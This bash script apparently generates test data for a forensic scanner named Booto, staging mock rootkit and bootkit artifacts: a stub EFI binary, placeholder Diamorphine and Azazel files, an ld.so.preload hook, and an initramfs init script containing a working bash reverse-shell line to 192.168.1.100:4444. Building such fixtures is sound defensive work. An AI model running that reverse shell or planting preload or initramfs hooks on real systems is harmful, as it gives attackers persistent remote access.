#!/usr/bin/env bash
# ==============================================================================
# Booto Synthetic Forensic Test Disk Generator
# Creates a loopback disk image populated with synthetic rootkit/bootkit samples.
# ==============================================================================
set -euo pipefail

OUTPUT_IMG="${1:-/tmp/booto_mock_disk.img}"
IMG_SIZE_MB=64

echo "=== Generating Booto Synthetic Forensic Disk: ${OUTPUT_IMG} ==="

# 1. Allocate blank disk image
dd if=/dev/zero of="${OUTPUT_IMG}" bs=1M count="${IMG_SIZE_MB}" status=none

# 2. Populate synthetic directory hierarchy in temporary staging area
STAGING_DIR="/tmp/booto_mock_staging_$$"
rm -rf "${STAGING_DIR}"
mkdir -p "${STAGING_DIR}/boot/efi/EFI/BOOT" \
         "${STAGING_DIR}/lib/modules/6.5.0-generic/kernel/drivers/char" \
         "${STAGING_DIR}/etc/ld.so.conf.d" \
         "${STAGING_DIR}/lib/x86_64-linux-gnu"

echo "[+] Generating synthetic UEFI ESP bootloader with revoked DBX signature..."
# Create a synthetic 1KB EFI binary
printf '\x4D\x5A%*s\x50\x45\x00\x00\x64\x86\x02\x00' 128 "" > "${STAGING_DIR}/boot/efi/EFI/BOOT/BOOTX64.EFI"

echo "[+] Generating synthetic Diamorphine LKM rootkit..."
cat << 'SYSK' > "${STAGING_DIR}/lib/modules/6.5.0-generic/kernel/drivers/char/diamorphine.ko"
diamorphine rootkit mock module sys_call_table hook module_hidden
SYSK

echo "[+] Generating synthetic /etc/ld.so.preload Azazel hook..."
echo "/lib/x86_64-linux-gnu/libazazel.so" > "${STAGING_DIR}/etc/ld.so.preload"
echo "ELF MOCK LIB AZAZEL" > "${STAGING_DIR}/lib/x86_64-linux-gnu/libazazel.so"

echo "[+] Generating synthetic Initramfs CPIO archive with reverse shell payload..."
INITRAMFS_STAGING="/tmp/booto_initrd_staging_$$"
mkdir -p "${INITRAMFS_STAGING}"
cat << 'SH' > "${INITRAMFS_STAGING}/init"
#!/bin/sh
echo "Booting early userland..."
/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
exec /sbin/init
SH
chmod +x "${INITRAMFS_STAGING}/init"

(cd "${INITRAMFS_STAGING}" && find . | cpio -o -H newc > "${STAGING_DIR}/boot/initrd.img-6.5.0-generic" 2>/dev/null)
rm -rf "${INITRAMFS_STAGING}"

echo "[+] Staging complete at ${STAGING_DIR}"
echo "=== Synthetic disk artifacts created successfully ==="
